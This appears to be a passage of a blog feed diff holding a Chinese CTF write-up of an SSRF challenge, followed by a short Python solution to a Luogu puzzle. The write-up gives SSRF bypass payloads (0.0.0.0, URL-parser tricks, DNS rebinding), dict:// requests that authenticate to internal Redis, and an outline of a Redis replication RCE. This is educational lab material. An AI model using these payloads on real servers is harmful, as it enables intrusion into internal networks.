+    &lt;span style=&#34;color:#ff79c6&#34;&gt;return&lt;/span&gt; ip2long(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;127.0.0.0&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;24&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$int_ip&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;24&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;||&lt;/span&gt; ip2long(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;10.0.0.0&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;24&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$int_ip&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;24&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;||&lt;/span&gt; ip2long(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;172.16.0.0&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;20&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$int_ip&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;20&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;||&lt;/span&gt; ip2long(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;192.168.0.0&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;16&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$int_ip&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;16&lt;/span&gt;;
+}
+
+&lt;span style=&#34;color:#ff79c6&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;safe_request_url&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$url&lt;/span&gt;)
+{
+
+    &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt; (check_inner_ip(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$url&lt;/span&gt;))
+    {
+        &lt;span style=&#34;color:#ff79c6&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$url&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39; is inner ip&amp;#39;&lt;/span&gt;;
+    }
+    &lt;span style=&#34;color:#ff79c6&#34;&gt;else&lt;/span&gt;
+    {
+        &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$ch&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; curl_init();
+        curl_setopt(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$ch&lt;/span&gt;, CURLOPT_URL, &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$url&lt;/span&gt;);
+        curl_setopt(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$ch&lt;/span&gt;, CURLOPT_RETURNTRANSFER, &lt;span style=&#34;color:#bd93f9&#34;&gt;1&lt;/span&gt;);
+        curl_setopt(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$ch&lt;/span&gt;, CURLOPT_HEADER, &lt;span style=&#34;color:#bd93f9&#34;&gt;0&lt;/span&gt;);
+        &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$output&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; curl_exec(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$ch&lt;/span&gt;);
+        &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$result_info&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; curl_getinfo(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$ch&lt;/span&gt;);
+        &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$result_info&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;redirect_url&amp;#39;&lt;/span&gt;])
+        {
+            safe_request_url(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$result_info&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;redirect_url&amp;#39;&lt;/span&gt;]);
+        }
+        curl_close(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$ch&lt;/span&gt;);
+        var_dump(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$output&lt;/span&gt;);
+    }
+
+}
+&lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt;(isset(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;url&amp;#39;&lt;/span&gt;])){
+    &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$url&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;url&amp;#39;&lt;/span&gt;];
+    &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#ff79c6&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;empty&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$url&lt;/span&gt;)){
+        safe_request_url(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$url&lt;/span&gt;);
+    }
+}
+&lt;span style=&#34;color:#ff79c6&#34;&gt;else&lt;/span&gt;{
+    highlight_file(__FILE__);
+}
+&lt;span style=&#34;color:#6272a4&#34;&gt;// Please visit hint.php locally.
+&lt;/span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;?&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;大致就先让你访问/hint.php，但有个ip检测，不能是内网ip&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;使用&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;gethostbyname
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;获取ip地址&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;防御了xip.io这类利用dns解析的绕过方法&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;使用&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;ip2long
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;将ip地址转为整数，判断是否为内网网段&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;防御了&lt;code&gt;127.0.0.1/8&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;但这里头肯定有问题，不然也不可能出这题，先搜搜$url_parse相关&lt;/p&gt;
+&lt;p&gt;最终找到一篇&lt;a class=&#34;link&#34; href=&#34;https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;翻译文章&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.anquanke.com/post/id/86527&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://www.anquanke.com/post/id/86527&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;（静待20min）&lt;/p&gt;
+&lt;p&gt;现在我们默认已经读过这篇文章了&lt;/p&gt;
+&lt;p&gt;来，让我们试试文章里的curl与其他语言url解析器联合使用所出现的问题&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;?url=http://@127.0.0.1:80 @baidu.com/hint.php
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;很有自信，但是返回了个bool(false)………………&lt;/p&gt;
+&lt;p&gt;为什么……直接搜wp，也是这个……留下了疑惑&lt;/p&gt;
+&lt;p&gt;肯定在这一块，好好的抛啥异常……&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;try&lt;/span&gt;
+    {
+        &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$url_parse&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;parse_url(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$url&lt;/span&gt;);
+    }
+    &lt;span style=&#34;color:#ff79c6&#34;&gt;catch&lt;/span&gt;(Exception &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$e&lt;/span&gt;)
+    {
+        &lt;span style=&#34;color:#ff79c6&#34;&gt;die&lt;/span&gt;(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;url fomat error&amp;#39;&lt;/span&gt;);
+        &lt;span style=&#34;color:#ff79c6&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;false&lt;/span&gt;;
+    }
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;好在wp里提供了另一种思路，DNS重绑定漏洞&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/NOSEC2019/article/details/103126829&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://blog.csdn.net/NOSEC2019/article/details/103126829&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;（静待15min）&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;(1)、服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP
+
+(2)、对于获得的IP进行判断，发现为非黑名单IP，则通过验证
+
+(3)、服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址。
+
+(4)、由于已经绕过验证，所以服务器端返回访问内网资源的结果。
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;现在我们又读了一篇文章，很棒，&lt;a class=&#34;link&#34; href=&#34;https://lock.cmpxchg8b.com/rebinder.html?tdsourcetag=s_pctim_aiomsg&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;工具网站&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;快试试！（？）&lt;/p&gt;
+&lt;p&gt;还有个方便的方法，题里忘了过滤了的&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;0.0.0.0&lt;/code&gt;代表本机&lt;code&gt;ipv4&lt;/code&gt;的所有地址，所以直接&lt;code&gt;http://0.0.0.0/hint.php&lt;/code&gt;也可以……&lt;/p&gt;
+&lt;p&gt;不错，所以为啥一开始翻ssrf过滤绕过的时候没找到这个方法^_^&lt;/p&gt;
+&lt;p&gt;好在我们现在可以看到hint.php了&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;?&lt;/span&gt;php
+&lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_SERVER&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;REMOTE_ADDR&amp;#39;&lt;/span&gt;]&lt;span style=&#34;color:#ff79c6&#34;&gt;===&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;127.0.0.1&amp;#34;&lt;/span&gt;){
+  highlight_file(__FILE__);
+}
+&lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt;(isset(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_POST&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;file&amp;#39;&lt;/span&gt;])){
+  file_put_contents(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_POST&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;file&amp;#39;&lt;/span&gt;],&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&amp;lt;?php echo &amp;#39;redispass is root&amp;#39;;exit();&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_POST&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;file&amp;#39;&lt;/span&gt;]);
+}
+&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;本来以为是过死亡exit&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://xz.aliyun.com/t/8163&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://xz.aliyun.com/t/8163&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;结果不是……&lt;/p&gt;
+&lt;p&gt;完全不会，今晚的目标就是成功复现！呜呜呜&lt;/p&gt;
+&lt;p&gt;redis？怎么说……我就知道它是种NoSQL型数据库，来了解一下。&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.cnblogs.com/powertoolsteam/p/redis.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://www.cnblogs.com/powertoolsteam/p/redis.html&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;首先……我要知道redis在啥端口——6379&lt;/p&gt;
+&lt;p&gt;然后题里告诉你密码是root&lt;/p&gt;
+&lt;p&gt;使用dict协议去访问redis&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;?url=dict://0.0.0.0:6379
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
+	&gt;
+	&lt;a href=&#34;https://pic.imgdb.cn/item/624021b127f86abb2a920b6e.png&#34; &gt;
+		&lt;img src=&#34;https://pic.imgdb.cn/item/624021b127f86abb2a920b6e.png&#34;
+			
+			
+			
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;存在密码校验，再加上密码&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;?url=dict://0.0.0.0:6379/auth root
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
+	&gt;
+	&lt;a href=&#34;https://pic.imgdb.cn/item/624021c727f86abb2a92a191.png&#34; &gt;
+		&lt;img src=&#34;https://pic.imgdb.cn/item/624021c727f86abb2a92a191.png&#34;
+			
+			
+			
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	&gt;
+	&lt;a href=&#34;https://pic.imgdb.cn/item/624021d527f86abb2a92fca9.png&#34; &gt;
+		&lt;img src=&#34;https://pic.imgdb.cn/item/624021d527f86abb2a92fca9.png&#34;
+			
+			
+			
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Redis客户端支持管道操作，可以通过单个写入操作发送多个命令，而无需在发出下一个命令之前读取上一个命令的服务器回复。所有的回复都可以在最后阅读。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;dict&lt;/code&gt;协议一次只能执行一条命令，因该是仅仅能进行密码验证。此处需要&lt;code&gt;gopher&lt;/code&gt;协议，可以一次性完成密码验证以及恶意命令执行。&lt;/p&gt;
+&lt;p&gt;攻击方式位Redis基于主从复制RCE&lt;/p&gt;
+&lt;p&gt;提前了解主从复制是啥&lt;/p&gt;
+&lt;p&gt;主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。
+redis的持久化使得机器即使重启数据也不会丢失，因为redis服务器重启后会把硬盘上的文件重新恢复到内存中，但是如果硬盘的数据被删除的话数据就无法恢复了，如果通过主从复制就能解决这个问题，主redis的数据和从redis上的数据保持实时同步，当主redis写入数据是就会通过主从复制复制到其它从redis。&lt;/p&gt;
+&lt;p&gt;接下来，利用这一点，我们创建&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;&#34; &gt;https://github.com/xmsec/redis-ssrf&lt;/a&gt;
+&lt;a class=&#34;link&#34; href=&#34;&#34; &gt;https://github.com/n0b0dyCN/redis-rogue-server&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;代码审计-&amp;gt;看到curl_exec想到ssrf-&amp;gt;打内网-&amp;gt;根据提示redisgetshell-&amp;gt;生成rogueserver（vps或buu中的linux靶机）-&amp;gt;利用gopher协议生成payload或者直接反弹shell&lt;/p&gt;
+&lt;p&gt;参考&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.secpulse.com/archives/132215.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://www.secpulse.com/archives/132215.html&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://liotree.github.io/2020/07/10/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%8E%84%E6%AD%A6%E7%BB%84-SSRFMe/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://liotree.github.io/2020/07/10/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%8E%84%E6%AD%A6%E7%BB%84-SSRFMe/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;学到了，&lt;a class=&#34;link&#34; href=&#34;https://liotree.github.io/2020/07/10/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%8E%84%E6%AD%A6%E7%BB%84-SSRFMe/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;这篇博客&lt;/a&gt;里绕过一开始限制的地方写的很全，建议去看看。&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>P5461赦免战俘</title>
+        <link>https://proben1.github.io/2021/p5461%E8%B5%A6%E5%85%8D%E6%88%98%E4%BF%98/</link>
+        <pubDate>Mon, 22 Nov 2021 16:37:25 +0800</pubDate>
+        
+        <guid>https://proben1.github.io/2021/p5461%E8%B5%A6%E5%85%8D%E6%88%98%E4%BF%98/</guid>
+        <description>&lt;h1 id=&#34;p5461-赦免战俘&#34;&gt;P5461 赦免战俘&lt;/h1&gt;
+&lt;p&gt;心态小裂，写了n遍，最后发现循环里忘加x，y了&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;a &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;int&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;input&lt;/span&gt;())
+b &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; [[&lt;span style=&#34;color:#bd93f9&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#ff79c6&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;range&lt;/span&gt;(&lt;span style=&#34;color:#bd93f9&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;**&lt;/span&gt;a)] &lt;span style=&#34;color:#ff79c6&#34;&gt;for&lt;/span&gt; j &lt;span style=&#34;color:#ff79c6&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;range&lt;/span&gt;(&lt;span style=&#34;color:#bd93f9&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;**&lt;/span&gt;a)]
+l &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;**&lt;/span&gt;a
+&lt;span style=&#34;color:#ff79c6&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;func&lt;/span&gt;(l,x,y):
+    &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt; l &lt;span style=&#34;color:#ff79c6&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;1&lt;/span&gt; :
+        &lt;span style=&#34;color:#ff79c6&#34;&gt;return&lt;/span&gt; 
+
+    &lt;span style=&#34;color:#ff79c6&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#ff79c6&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;range&lt;/span&gt;(x,x&lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;int&lt;/span&gt;(l&lt;span style=&#34;color:#ff79c6&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;2&lt;/span&gt;)) :
+        &lt;span style=&#34;color:#ff79c6&#34;&gt;for&lt;/span&gt; j &lt;span style=&#34;color:#ff79c6&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;range&lt;/span&gt;(y,y&lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;int&lt;/span&gt;(l&lt;span style=&#34;color:#ff79c6&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;2&lt;/span&gt;)) :
+            b[i][j] &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;0&lt;/span&gt;
+    
+    func(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;int&lt;/span&gt;(l&lt;span style=&#34;color:#ff79c6&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;2&lt;/span&gt;),x&lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;int&lt;/span&gt;(l&lt;span style=&#34;color:#ff79c6&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;2&lt;/span&gt;),y)
+    func(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;int&lt;/span&gt;(l&lt;span style=&#34;color:#ff79c6&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;2&lt;/span&gt;),x,y&lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;int&lt;/span&gt;(l&lt;span style=&#34;color:#ff79c6&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;2&lt;/span&gt;))
+    func(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;int&lt;/span&gt;(l&lt;span style=&#34;color:#ff79c6&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;2&lt;/span&gt;),x&lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;int&lt;/span&gt;(l&lt;span style=&#34;color:#ff79c6&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;2&lt;/span&gt;),y&lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;int&lt;/span&gt;(l&lt;span style=&#34;color:#ff79c6&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;2&lt;/span&gt;))
+
+func(l,&lt;span style=&#34;color:#bd93f9&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;0&lt;/span&gt;)
+&lt;span style=&#34;color:#ff79c6&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#ff79c6&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;range&lt;/span&gt;(&lt;span style=&#34;color:#bd93f9&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;**&lt;/span&gt;a):
+    &lt;span style=&#34;color:#ff79c6&#34;&gt;for&lt;/span&gt; j &lt;span style=&#34;color:#ff79c6&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;range&lt;/span&gt;(&lt;span style=&#34;color:#bd93f9&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;**&lt;/span&gt;a):
+        &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;print&lt;/span&gt;(b[i][j],end&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34; &amp;#34;&lt;/span&gt;)
+    &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;print&lt;/span&gt;()
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
         </item>
         <item>
         <title>刷题1</title>
